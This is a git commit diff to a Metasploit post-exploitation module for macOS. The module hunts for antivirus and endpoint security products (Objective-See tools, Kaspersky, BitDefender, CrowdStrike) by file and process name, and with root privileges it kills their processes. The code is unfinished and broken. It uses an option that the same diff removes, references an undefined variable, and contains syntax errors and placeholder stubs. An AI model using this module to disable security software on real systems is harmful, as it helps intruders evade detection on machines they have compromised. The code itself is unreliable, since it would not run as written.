1350853ef68a3d958c0d152e1404ae106178991e
Corey <gardnerappdevelopment@gmail.com>
2026-02-28 12:55:48 -0500

    Add opts, refactor enumeration methods

--- modules/post/osx/gather/antivirus_hunter.rb
+++ modules/post/osx/gather/antivirus_hunter.rb
@@ -8,15 +8,19 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::OSX::Priv
 
+  # Good places to check: startup folders, Applications folder and  process list 
+  # TODO put fail_no root back in and kill_processes
+
   def initialize(info = {})
     super(
       update_info(
         info,
-        'OSX Antivirus Hunter' => 'OSX Antivirus Hunter: Enumerate, Disable and Uninstall OSX AV Products',
+        'OSX Antivirus Hunter' => 'OSX Antivirus Hunter: Enumerate and disable antivirus products',
         'Description' => %q{
-          This module enumerates OSX systems for the presence of antivirus products. Disabling and uninstalling AV applications
-          is supported so long as the user has root privilleges. Objective Cee, BitDefender, and CleanMyMac are all supported. Enumeration 
-          for additional products is possible through setting the CUSTOM_FILE option. 
+          This module enumerates OSX systems for the presence of antivirus products. Target Products include: Objective-Cee, Kaspersky,
+          BitDefender and CrowdStrike. Presence of these products is determined through file system artifiacts and process names. Enumeration 
+          of additional products can be done through the CUSTOM_PROCESSES and CUSTOM_FILES options. The KILL_PROCESSES option will atempt to 
+          send a kill signal to each of the process id's found in this module. Root privilleges are required for this capability.
         },
         'License' => MSF_LICENSE,
         'Author' => [ 'gardnerapp', 'cdelafuente-r7' ],
@@ -30,15 +34,10 @@ class MetasploitModule < Msf::Post
   )
     register_options(
       [
-        OptBool.new('KILL_PROCESSES', [
-          true, 'Kills processes of installed AV  products. Requires root privileges.', false
-        ]),
-        OptBool.new('UNINSTALL', [
-          true, 'Uninstall AV products. Only supported for default product list.', false
-        ]),
-        OptString.new('CUSTOM_FILE', 
-                      true, ['A custom list of products to enumerate the system for. Each item should include the full path and be followed by
-        a newline.', '']),
+        OptString.new('CUSTOM_PROCESSES', 
+                      true, ['File containing process names to hunt for. Each value should be seperated by a newline character', '']),
+        OptString.new('CUSTOM_FILES',
+                      true, ['File containing files and directories to hunt for. Each value should be seperated by a newline character', '']),
       ]
     )
   end
@@ -46,46 +45,77 @@ class MetasploitModule < Msf::Post
   # Determine which products are installed and their pid if any
   # products arg is in array w each elem in the format of {:name => 'AV Name', :path => '/Applications/AV Name.app'}
   # returns a hash with keys of :name, :path, and :pid
-  def enumerate(products)
+  def enumerate_files(products)
     installed = []
-    products.each do |prod| 
-      if directory? prod[:path]
-        prod[:pid] = []
-        installed << prod
-        @processes.each {|process| prod[:pid] << process[:pid] if process[:name].include? prod[:name].split(' ')[0]}
-      end 
-    end 
+    products.each { |prod| installed << prod if directory?(prod) or file?(prod) }
     installed
   end
 
-  def fail_no_root
-    unless is_root?
-      fail_with(Failure::BadConfig,
-                'The current session is not root. Please escalate the session and rerun the module.')
-    end
-  end
-
-  def objective_see_products
-    ['LuLu', 'BlockBlock Helper', 'Do Not Disturb', 'ReiKey', 'RansomWhere', 'OverSight'].map! {|p| "/Applications/#{p}.app"}
+  def objective_see
+    ['LuLu', 'BlockBlock Helper', 'Do Not Disturb', 'ReiKey', 'RansomWhere', 'OverSight']
+     # .map! {|p| "/Applications/#{p}.app"}
   end 
 
-  def 
+  def kapersky; end 
+  def bitdefender; end 
+  def crowdstrike; end 
+
+  # good acessory canidate method
+  def file_to_array(file)
+    f = File.open file
+    f.readlines.map(&chomp)
+  end 
+
+  def all_products
+    all = []
+    %i[objective_see kapersky bitdefender crowdstrike].each {|p| all.merge p}
+  end 
+
+  def enum_processes(proc_array)
+    @processes.select do |element|
+      proc_array.each do |process| 
+        return true if element =~ /#{process}/i # this may only in the block or out of enum_processes need to test this method thuroughly 
+      end
+    end 
+  end
+
+  def fail_if_not_root
+    fail_with(Failure::BadConfig, "Current session is not root. Please escelate privilleges before re-running this module.") unless is_root? 
+  end 
 
   def run
     # TODO test, get more products. Test custom file, reading file. 
     print_status('Retrieving process list...')
     @processes = get_processes
 
-    print_status('Enumerating AV products...')
+    print_status('Hunting processes for AV products...')
 
-    if !datastore['CUSTOM_FILE'].empty?
-      # prods = File.read(datastore['CUSTOM_FILE']) 
-      # Might need to parse prods and err check 
-    else 
-      prods = objective_see_products # this will change in the future
+    relevant_processes = enum_processes(all_products)
+
+    if datastore['CUSTOM_PROCESSES']
+      print_status('Hunting for custom AV processes...') 
+      custom_processes = file_to_array datastore['CUSTOM_PROCESSES']
+      relevant_processes.merge enum_processes(custom_processes)
     end 
 
-    installed = enumerate(prods)
+    av_files = [] #todo 
+    installed_files = enumerate_files av_files 
+
+    if datastore['CUSTOM_FILES']
+      print_status('Hunting for custom AV files...')
+      custom_files = file_to_array datastore['CUSTOM_FILES']
+      installed_files << enumerate_files custom_files
+    end 
+    
+    if datastore['KILL_PROCESSES']
+      fail_if_not_root
+      installed,each do |process|
+       result = kill_process process['pid']
+       print_good("Kill signal for #{process['name']} #{pid} was successful") if result
+      end 
+    end 
+
+    # we arehere 
 
     if prods.empty?
       print_error('No AVproducts were found to be installed on the system.')
@@ -99,7 +129,7 @@ class MetasploitModule < Msf::Post
                 data: installed_product, update: :unique_data)
 
     if datastore['KILL_PROCESSES']
-      fail_no_root
+      fail_if_not_root
       products.each do |prod|
         prod[:pid].each {|pid| kill_process pid}
       end 
